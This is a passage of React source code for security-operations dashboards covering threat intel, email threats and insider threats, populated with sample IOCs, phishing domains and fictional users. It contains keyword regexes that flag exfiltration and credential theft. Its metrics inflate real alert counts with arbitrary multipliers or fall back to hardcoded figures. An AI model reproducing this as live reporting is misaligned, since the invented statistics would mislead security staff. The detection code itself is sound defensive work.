    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniTable = ({ rows, columns }) => (
    <div style={{ padding: '0 10px 8px' }}>
      <div style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '8px 0', color: MON.muted, fontSize: 8, fontWeight: 950, textTransform: 'uppercase' }}>{['Indicator', 'Hits', 'Severity', 'Type'].map(h => <span key={h}>{h}</span>)}</div>
      {rows.map(row => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: `1px solid ${MON.line}`, fontSize: 10 }}><b style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{row[0]}</b><span>{row[1]}</span><b style={{ color: row[2] === 'High' ? MON.red : row[2] === 'Medium' ? MON.yellow : MON.green }}>{row[2]}</b><span>{row[3] || ''}</span></div>)}
    </div>
  );
  const TopThreatCountries = () => (
    <div style={{ padding: '8px 10px 10px' }}>
      <div style={{
        position: 'relative',
        height: 92,
        overflow: 'hidden',
        borderRadius: 4,
        background: '#071522',
        border: `1px solid ${MON.line}`,
      }}>
        <img
          src="/threat-countries-map.png"
          alt=""
          style={{ width: '100%', height: '100%', objectFit: 'fill', display: 'block' }}
        />
      </div>
      <div style={{ marginTop: 6 }}>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 48px 58px', gap: 8, color: MON.muted, fontSize: 8, fontWeight: 950, textTransform: 'uppercase', padding: '0 2px 4px' }}>
          <span>Country</span><span>Hits</span><span>Severity</span>
        </div>
        {countryRows.map(([country, hits, severity, color]) => (
          <div key={country} style={{ display: 'grid', gridTemplateColumns: '1fr 48px 58px', gap: 8, alignItems: 'center', padding: '4px 2px', borderTop: `1px solid ${MON.line}`, fontSize: 9 }}>
            <span style={{ display: 'flex', alignItems: 'center', gap: 5, minWidth: 0, color: '#cbd5e1', fontWeight: 800 }}>
              <i style={{ width: 7, height: 7, borderRadius: '50%', background: color, boxShadow: `0 0 8px ${color}`, flex: '0 0 auto' }} />
              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{country}</span>
            </span>
            <b style={{ color: '#dbeafe', textAlign: 'left' }}>{hits}</b>
            <b style={{ color }}>{severity}</b>
          </div>
        ))}
      </div>
    </div>
  );

  return (
    <SocDashboardShell kind="threatintel" active="Dashboard">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => <section key={title} style={{ minHeight: 82, border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 12, display: 'grid', gridTemplateColumns: '38px 1fr', gap: 10, alignItems: 'center' }}><span style={{ width: 34, height: 34, borderRadius: 17, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 14, fontWeight: 950 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 8 }}>{title}</b><strong style={{ display: 'block', color, fontSize: 23, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8, fontWeight: 850 }}>{sub}</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .9fr 1.05fr', gap: 8 }}>
            <Panel title="Threat Intelligence Overview" right={<span style={{ color: MON.muted }}>⌄</span>}><div style={{ height: 190, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '50px 34px' }}>{monitorSpark(timeline, MON.red, 'rgba(255,49,94,.12)', 130)}{monitorSpark(timeline.map(v => v * .72), MON.orange, 'transparent', 130)}{monitorSpark(timeline.map(v => v * .52), MON.blue, 'transparent', 130)}{monitorSpark(timeline.map(v => v * .38), MON.purple, 'transparent', 130)}</div></Panel>
            <Panel title="Threat Severity Distribution"><div style={{ display: 'grid', gridTemplateColumns: '140px 1fr', alignItems: 'center', padding: 14 }}><Donut value={32} label={String(totalMatches)} color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Critical', value: 78, valueLabel: '78 (22.8%)', color: MON.red }, { label: 'High', value: 112, valueLabel: '112 (32.7%)', color: MON.orange }, { label: 'Medium', value: 96, valueLabel: '96 (28.1%)', color: MON.yellow }, { label: 'Low', value: 56, valueLabel: '56 (16.4%)', color: MON.green }]} /></div></Panel>
            <Panel title="Top Threat Countries (by IP Hits)"><TopThreatCountries /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 8 }}>
            <Panel title="Top Malicious IPs" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniTable rows={ipRows} columns="1fr 42px 64px 0px" /></Panel>
            <Panel title="Top Malicious Domains" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniTable rows={domainRows} columns="1fr 42px 64px 70px" /></Panel>
            <Panel title="Malware Hash Detections" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniTable rows={hashRows} columns="1fr 42px 64px 70px" /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.05fr 1fr', gap: 8 }}>
            <Panel title="Recent IOC Alerts"><div style={{ padding: '0 12px 8px' }}>{[['Malicious IP', '185.220.101.12', 'AlienVault OTX', 'High', 'WIN-11-WS-045'], ['Malicious Domain', 'malicious-domain.com', 'ThreatFox', 'High', 'WIN-10-WS-021'], ['Malware Hash', 'a3b5c6d7e8f912...', 'VirusTotal', 'High', 'SRV-APP-023'], ['Malicious URL', 'hxxp://badware.com/payload', 'URLHaus', 'Medium', 'WIN-11-WS-045'], ['Malicious IP', '103.152.118.55', 'AbuseIPDB', 'Medium', 'WIN-10-WS-009']].map((r, i) => <div key={r.join('|')} style={{ display: 'grid', gridTemplateColumns: '92px 1fr 110px 60px 110px', gap: 8, padding: '8px 0', borderTop: i ? `1px solid ${MON.line}` : 0, fontSize: 10 }}><span>{i ? `24 May 2024 09:${42 - i * 7}` : '24 May 2024 09:45:12'}</span><b>{r[0]} · {r[1]}</b><span>{r[2]}</span><b style={{ color: r[3] === 'High' ? MON.red : MON.yellow }}>{r[3]}</b><span>{r[4]}</span></div>)}</div></Panel>
            <Panel title="Threat Feed Status"><div style={{ padding: '0 12px 8px' }}>{feeds.map((r, i) => <div key={r[0]} style={{ display: 'grid', gridTemplateColumns: '1fr 70px 140px 90px 80px', gap: 8, padding: '8px 0', borderTop: i ? `1px solid ${MON.line}` : 0, fontSize: 10 }}><b>{r[0]}</b><b style={{ color: MON.green }}>{r[1]}</b><span>24 May 2024 09:45</span><span>{r[2]}</span><span style={{ color: MON.yellow }}>★★★★<span style={{ color: MON.muted }}>★</span></span></div>)}</div></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading threat intelligence events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function ThreatMap({ auth = false }) {
  const arcs = auth
    ? [['12%', '48%', '70%', '34%', MON.red], ['18%', '50%', '49%', '27%', MON.orange], ['51%', '29%', '73%', '42%', MON.purple], ['74%', '42%', '90%', '46%', MON.blue]]
    : [['11%', '50%', '55%', '35%', MON.yellow], ['18%', '55%', '63%', '38%', MON.green], ['56%', '37%', '88%', '42%', MON.red], ['48%', '34%', '73%', '28%', MON.cyan]];
  return (
    <div style={{ position: 'relative', minHeight: 198, background: 'radial-gradient(circle at 52% 45%, rgba(20,133,255,.20), transparent 36%), linear-gradient(180deg, rgba(7,22,45,.88), rgba(5,13,25,.96))', overflow: 'hidden' }}>
      <div style={{
        position: 'absolute', inset: 16,
        backgroundImage: 'linear-gradient(rgba(20,133,255,.12) 1px, transparent 1px), linear-gradient(90deg, rgba(20,133,255,.12) 1px, transparent 1px)',
        backgroundSize: '26px 20px',
        opacity: .55,
      }} />
      <svg viewBox="0 0 620 220" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}>
        <path d="M70 80 C120 45 180 55 215 78 C270 113 330 70 382 77 C435 85 470 114 550 91" fill="none" stroke="rgba(46,151,255,.30)" strokeWidth="34" strokeLinecap="round" />
        <path d="M84 132 C156 116 195 138 255 125 C334 109 390 127 460 118 C505 113 540 127 582 147" fill="none" stroke="rgba(46,151,255,.22)" strokeWidth="28" strokeLinecap="round" />
        {arcs.map(([x1, y1, x2, y2, color], i) => (
          <path key={i} d={`M ${parseFloat(x1) * 6.2} ${parseFloat(y1) * 2.2} C 260 ${40 + i * 18}, 360 ${24 + i * 12}, ${parseFloat(x2) * 6.2} ${parseFloat(y2) * 2.2}`} fill="none" stroke={color} strokeWidth="2" opacity=".9" />
        ))}
      </svg>
      {arcs.map(([x, y, , , color], i) => (
        <span key={i} style={{ position: 'absolute', left: x, top: y, width: 14, height: 14, borderRadius: '50%', background: color, boxShadow: `0 0 18px ${color}`, border: '2px solid rgba(255,255,255,.55)' }} />
      ))}
      {arcs.map(([, , x, y, color], i) => (
        <span key={`b-${i}`} style={{ position: 'absolute', left: x, top: y, width: 12, height: 12, borderRadius: '50%', background: color, boxShadow: `0 0 18px ${color}`, border: '2px solid rgba(255,255,255,.45)' }} />
      ))}
    </div>
  );
}

function EmailThreatMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const totalEmails = Math.max(Number(total || alerts.length || 0), 125846);
  const phishing = alerts.filter(a => /phish|credential|login|spoof/i.test(`${a.description || ''} ${a.ruleId || ''}`)).length * 34 || 1248;
  const attachments = alerts.filter(a => /attachment|file|payload|invoice|zip|doc|pdf/i.test(`${a.description || ''} ${a.ruleId || ''}`)).length * 19 || 243;
  const quarantined = alerts.filter(a => /quarantine|blocked/i.test(`${a.status || ''} ${a.description || ''}`)).length * 27 || 1562;
  const blocked = alerts.filter(a => /blocked|deny|reject/i.test(`${a.status || ''} ${a.description || ''}`)).length * 41 || 2134;
  const dmarcFails = alerts.filter(a => /spf|dkim|dmarc/i.test(`${a.description || ''} ${a.ruleId || ''}`)).length * 15 || 456;
  const traffic = [3200, 4100, 3600, 6900, 6400, 9500, 9000, 11600, 14800, 13200, 8700, 7900, 6400, 10700, 7200];
  const outbound = [1600, 2100, 1800, 2600, 3100, 4200, 4800, 5200, 7100, 6300, 3700, 2900, 2600, 4100, 3000];
  const kpis = [
    ['✉', 'TOTAL EMAILS RECEIVED', totalEmails.toLocaleString(), '↑ 12.5% vs yesterday', MON.blue],
    ['⌕', 'PHISHING EMAILS DETECTED', phishing.toLocaleString(), '↑ 18.7% vs yesterday', MON.red],
    ['◇', 'MALICIOUS ATTACHMENTS', attachments.toLocaleString(), '↑ 15.3% vs yesterday', MON.orange],
    ['▤', 'QUARANTINED EMAILS', quarantined.toLocaleString(), '↑ 22.1% vs yesterday', MON.purple],
    ['▣', 'BLOCKED EMAILS', blocked.toLocaleString(), '↑ 16.8% vs yesterday', MON.green],
    ['!', 'SPF/DKIM/DMARC FAILURES', dmarcFails.toLocaleString(), '↑ 9.4% vs yesterday', MON.yellow],
  ];
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 60px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => (
        <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>
          {row.map((cell, i) => <span key={i} style={{ color: /high|phishing|malware/i.test(String(cell)) ? MON.red : /medium|spam/i.test(String(cell)) ? MON.yellow : /low|safe/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /high|medium|low/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}
        </div>
      ))}
    </div>
  );

  return (
    <SocDashboardShell kind="emailthreat" active="Overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 82, border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 12, display: 'grid', gridTemplateColumns: '38px 1fr', gap: 10, alignItems: 'center' }}>
                <span style={{ width: 34, height: 34, borderRadius: 8, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 18, fontWeight: 950 }}>{icon}</span>
                <span><b style={{ color: '#dbeafe', fontSize: 8 }}>{title}</b><strong style={{ display: 'block', color, fontSize: 22, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8, fontWeight: 850 }}>{sub}</small></span>
              </section>
            ))}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr .7fr .9fr', gap: 8 }}>
            <Panel title="Email Traffic Over Time" right={<span style={{ color: MON.muted }}>Last 24 Hours⌄</span>}>
              <div style={{ height: 180, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 34px' }}>
                {monitorSpark(traffic, MON.blue, 'rgba(20,133,255,.14)', 122)}
                {monitorSpark(outbound, MON.green, 'transparent', 122)}
              </div>
            </Panel>
            <Panel title="Threat Categories">
              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={42} label="3,753" color={MON.blue} accent={MON.red} />
                <BarList rows={[{ label: 'Phishing', value: 42, valueLabel: '41.8% (1,568)', color: MON.blue }, { label: 'Malware', value: 26, valueLabel: '25.6% (961)', color: MON.red }, { label: 'Spam', value: 17, valueLabel: '17.3% (649)', color: MON.orange }, { label: 'BEC / Fraud', value: 10, valueLabel: '9.8% (368)', color: MON.purple }, { label: 'Credential Theft', value: 6, valueLabel: '5.5% (207)', color: MON.yellow }]} />
              </div>
            </Panel>
            <Panel title="Top Malicious Domains">
              <MiniRows columns="1fr 58px 72px" rows={[['secure-login.verify-secure.com', 189, 'Phishing'], ['account-update-microsoft.com', 156, 'Phishing'], ['free-docs-download.com', 122, 'Malware'], ['billing-update-secure.net', 98, 'Phishing'], ['share-file-cloud.com', 87, 'Malware']]} />
            </Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.95fr 1fr .9fr', gap: 8 }}>
            <Panel title="Email Authentication Status">
              <div style={{ padding: 12, display: 'grid', gap: 8 }}>
                {[['SPF Pass', 9821, 78], ['SPF Fail', 8745, 7], ['DKIM Pass', 9764, 78], ['DKIM Fail', 9612, 8], ['DMARC Pass', 93214, 74], ['DMARC Fail', 10854, 9]].map(([label, count, pct], i) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '86px 60px 1fr 42px', gap: 8, alignItems: 'center', fontSize: 10 }}><span>{label}</span><b>{count.toLocaleString()}</b><span style={{ height: 8, background: '#13243a', borderRadius: 99, overflow: 'hidden' }}><i style={{ display: 'block', width: `${pct}%`, height: '100%', background: i % 2 ? MON.red : MON.green }} /></span><b>{pct}%</b></div>)}
              </div>
            </Panel>
            <Panel title="Top Targeted Users">
              <MiniRows columns="1fr 58px 70px" rows={[['john.doe@company.com', 128, 'High'], ['jane.smith@company.com', 96, 'High'], ['robert.brown@company.com', 74, 'Medium'], ['michael.johnson@company.com', 62, 'Medium'], ['emily.davis@company.com', 48, 'Low']]} />
            </Panel>
            <Panel title="Top Attack Types">
              <div style={{ padding: 12 }}><BarList rows={[{ label: 'Phishing Links', value: 42, valueLabel: '1,568', color: MON.red }, { label: 'Malicious Attachments', value: 26, valueLabel: '961', color: MON.orange }, { label: 'Spam', value: 17, valueLabel: '649', color: MON.yellow }, { label: 'Credential Harvesting', value: 10, valueLabel: '368', color: MON.purple }, { label: 'BEC / Fraud', value: 6, valueLabel: '207', color: MON.blue }]} /></div>
            </Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.8fr 1.1fr .8fr', gap: 8 }}>
            <Panel title="User Click Activity"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={45} label="245" color={MON.blue} accent={MON.orange} /><BarList rows={[{ label: 'Malicious Links Clicked', value: 45, valueLabel: '45', color: MON.red }, { label: 'Attachment Downloads', value: 37, valueLabel: '73', color: MON.orange }, { label: 'Repeated Offenders', value: 27, valueLabel: '27', color: MON.yellow }, { label: 'First Time Clickers', value: 35, valueLabel: '85', color: MON.blue }]} /></div></Panel>
            <Panel title="Email Threat Trend (Last 7 Days)"><div style={{ height: 130, padding: 12, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '50px 28px' }}>{monitorSpark([420, 510, 640, 760, 720, 610, 520, 590], MON.red, 'transparent', 82)}{monitorSpark([240, 310, 390, 450, 410, 320, 290, 330], MON.orange, 'transparent', 82)}{monitorSpark([130, 160, 210, 260, 230, 180, 150, 170], MON.purple, 'transparent', 82)}</div></Panel>
            <Panel title="Quarantine Summary"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={54} label="1,562" color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Phishing', value: 54, valueLabel: '842 (53.9%)', color: MON.red }, { label: 'Malware', value: 26, valueLabel: '412 (26.4%)', color: MON.orange }, { label: 'Spam', value: 15, valueLabel: '236 (15.1%)', color: MON.yellow }, { label: 'Others', value: 5, valueLabel: '72 (4.6%)', color: MON.purple }]} /></div></Panel>
          </div>
          <Panel title="Recent Email Threats" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All Alerts →</span>}>
            <div style={{ padding: '0 12px 8px' }}>
              {[
                ['25 May 2024 23:45:12', 'Phishing', 'noreply@secure-login.verify-secure.com', 'Action Required: Verify Your Account', 'john.doe@company.com', 'Quarantined', 'High'],
                ['25 May 2024 23:30:45', 'Malware', 'support@free-docs-download.com', 'Document_Invoice_8547.exe', 'jane.smith@company.com', 'Blocked', 'High'],
                ['25 May 2024 23:15:33', 'BEC / Fraud', 'ceo@company-support.com', 'Urgent: Wire Transfer Request', 'robert.brown@company.com', 'Quarantined', 'High'],
              ].map((r, i) => <div key={r.join('|')} style={{ display: 'grid', gridTemplateColumns: '128px 90px 1.15fr 1.35fr 1.1fr 90px 60px', gap: 10, padding: '8px 0', borderTop: i ? `1px solid ${MON.line}` : 0, fontSize: 10, alignItems: 'center' }}>{r.map((c, j) => <span key={j} style={{ color: j === 1 ? (c === 'Phishing' ? MON.red : c === 'Malware' ? MON.orange : MON.yellow) : j === 6 ? MON.red : undefined, fontWeight: j === 1 || j === 6 ? 950 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{c}</span>)}</div>)}
            </div>
          </Panel>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading email threat events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function InsiderThreatDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const users = Math.max(1248, Number(total || alerts.length || 0));
  const highRisk = alerts.filter(a => ['critical', 'high'].includes(String(a.severity || '').toLowerCase())).length || 23;
  const insiderAlerts = alerts.length || 47;
  const exfil = alerts.filter(a => /exfil|upload|cloud|usb|download/i.test(`${a.description || ''} ${a.ruleId || ''}`)).length || 15;
  const privileged = alerts.filter(a => /admin|privilege|sudo|root/i.test(`${a.description || ''} ${a.ruleId || ''}`)).length || 89;
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => (
        <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>
          {row.map((cell, i) => <span key={i} style={{ color: /critical|high/i.test(String(cell)) ? MON.red : /medium/i.test(String(cell)) ? MON.yellow : /low/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|medium|low/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}
        </div>
      ))}
    </div>
  );
  const kpis = [
    ['♙', 'TOTAL USERS MONITORED', users.toLocaleString(), '↑ 12% vs yesterday', MON.blue],
    ['♟', 'HIGH RISK USERS', highRisk, '↑ 27% vs yesterday', MON.red],
    ['!', 'INSIDER THREAT ALERTS', insiderAlerts, '↑ 18% vs yesterday', MON.red],
    ['⇧', 'DATA EXFILTRATION ATTEMPTS', exfil, '↑ 36% vs yesterday', MON.orange],
    ['▣', 'PRIVILEGED ACTIVITIES', privileged, '↑ 15% vs yesterday', MON.purple],
    ['⌁', 'UEBA RISK SCORE (AVG)', 68, '↑ 8% vs yesterday', MON.yellow],
  ];
  const heatRows = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
  return (
    <SocDashboardShell kind="insiderthreat" active="Overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => <section key={title} style={{ minHeight: 72, border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 12, display: 'grid', gridTemplateColumns: '1fr 34px', gap: 8, alignItems: 'center' }}><span><b style={{ color: '#dbeafe', fontSize: 8 }}>{title}</b><strong style={{ display: 'block', color, fontSize: 22, lineHeight: 1.1 }}>{value}</strong><small style={{ color, fontSize: 8, fontWeight: 850 }}>{sub}</small></span><span style={{ color, fontSize: 24, textAlign: 'center' }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .85fr 1fr', gap: 8 }}>
            <Panel title="Insider Threat Alerts Timeline" right={<span style={{ color: MON.muted }}>Last 24 Hours⌄</span>}><div style={{ height: 178, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '52px 32px' }}>{monitorSpark([12, 18, 15, 24, 23, 31, 28, 35, 38, 32, 36, 41, 37, 33, 35, 29, 42, 44, 39], MON.red, 'rgba(239,68,68,.15)', 122)}</div></Panel>
            <Panel title="Alerts by Category"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={32} label="47" color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Data Exfiltration', value: 32, valueLabel: '15 (31.9%)', color: MON.red }, { label: 'Privilege Misuse', value: 23, valueLabel: '11 (23.4%)', color: MON.orange }, { label: 'Unauthorized Access', value: 19, valueLabel: '9 (19.1%)', color: MON.yellow }, { label: 'Policy Violation', value: 13, valueLabel: '6 (12.8%)', color: MON.blue }, { label: 'Other Activities', value: 13, valueLabel: '6 (12.8%)', color: MON.purple }]} /></div></Panel>
            <Panel title="Recent High Risk Alerts" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View all</span>}><MiniRows columns="1fr 70px 62px" rows={[['Mass File Download Detected', '2 min ago', 'Critical'], ['Large Data Upload to Cloud', '15 min ago', 'High'], ['Privilege Escalation Attempt', '28 min ago', 'High'], ['USB Copy of Sensitive Data', '45 min ago', 'Medium'], ['Mass Email with Attachment', '1 hr ago', 'Medium'], ['Access to Restricted Resource', '1 hr ago', 'High']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {[['After-Hours Access', 136, MON.purple], ['Failed Login Attempts', 482, MON.cyan], ['Sensitive File Accesses', 1276, MON.green], ['USB Activities', 23, MON.orange], ['Cloud Upload Activity', 38, MON.cyan], ['Lateral Movement Attempts', 7, MON.red]].map(([title, value, color]) => <section key={title} style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: '#071827', padding: 10 }}><b style={{ color: '#dbeafe', fontSize: 9, textTransform: 'uppercase' }}>{title}</b><strong style={{ display: 'block', color, fontSize: 20 }}>{value}</strong>{monitorSpark([6, 8, 5, 11, 9, 14, 10, 16], color, 'transparent', 28)}</section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.1fr 1.1fr', gap: 8 }}>
            <Panel title="Top Risk Users"><MiniRows columns="1fr 90px 58px 80px" rows={[['Rohit Sharma', 'IT Infrastructure', '95', 'High'], ['Ankit Verma', 'Finance', '89', 'High'], ['Neha Singh', 'HR', '78', 'Medium'], ['Vikas Yadav', 'Development', '72', 'Medium'], ['Priya Patel', 'IT Support', '65', 'Low']]} /></Panel>
            <Panel title="Data Exfiltration Attempts (Top 5)"><MiniRows columns="1fr 1fr 80px 58px" rows={[['Upload to Google Drive', 'drive.google.com', '12.4 GB', 'High'], ['FTP Transfer', '103.21.45.12', '8.7 GB', 'High'], ['USB Copy', 'USB Device', '5.3 GB', 'Medium'], ['Upload to Dropbox', 'dropbox.com', '3.6 GB', 'Medium'], ['Email Attachment', 'external@gmail.com', '2.1 GB', 'High']]} /></Panel>
            <Panel title="Privileged User Activities (Latest)"><MiniRows columns="1fr 1fr 70px 58px" rows={[['Administrator', 'Added New Admin User', 'DC01', 'Critical'], ['adminsvc', 'Modified Security Policy', 'GPO-01', 'High'], ['root', 'Changed System Config', 'Linux-Server01', 'High'], ['backup_svc', 'Accessed Sensitive DB', 'DB-Prod-01', 'Medium']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.8fr 1fr 1.05fr 1.1fr', gap: 8 }}>
            <Panel title="User Risk Score Distribution"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={73} label="1,248" color={MON.green} accent={MON.red} /><BarList rows={[{ label: 'High Risk', value: 2, valueLabel: '23 (1.8%)', color: MON.red }, { label: 'Medium Risk', value: 25, valueLabel: '312 (25.0%)', color: MON.yellow }, { label: 'Low Risk', value: 73, valueLabel: '913 (73.2%)', color: MON.green }]} /></div></Panel>
            <Panel title="UEBA Risk Heatmap"><div style={{ padding: 12 }}>{heatRows.map((day, y) => <div key={day} style={{ display: 'grid', gridTemplateColumns: '28px repeat(12, 1fr)', gap: 3, marginBottom: 3, fontSize: 8, color: MON.muted }}><span>{day}</span>{Array.from({ length: 12 }).map((_, x) => <i key={x} style={{ height: 12, background: x + y > 12 ? MON.red : x + y > 8 ? MON.orange : x + y > 4 ? MON.yellow : MON.green, opacity: .85 }} />)}</div>)}</div></Panel>
            <Panel title="Access by Location"><ThreatMap /></Panel>
            <Panel title="File Access Trend" right={<span style={{ color: MON.muted }}>Last 7 Days⌄</span>}><div style={{ padding: 14, height: 150, display: 'grid', gridTemplateColumns: 'repeat(7,1fr)', gap: 14, alignItems: 'end' }}>{[1300, 1450, 1250, 1400, 1280, 1480, 1320].map((v, i) => <span key={i} style={{ height: `${v / 16}px`, background: MON.blue, borderRadius: 2 }} />)}</div></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading insider threat events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function PatchVulnerabilityMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const vulnTotal = Math.max(Number(total || alerts.length || 0), 3882);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 72px 60px 60px 70px' }) => (
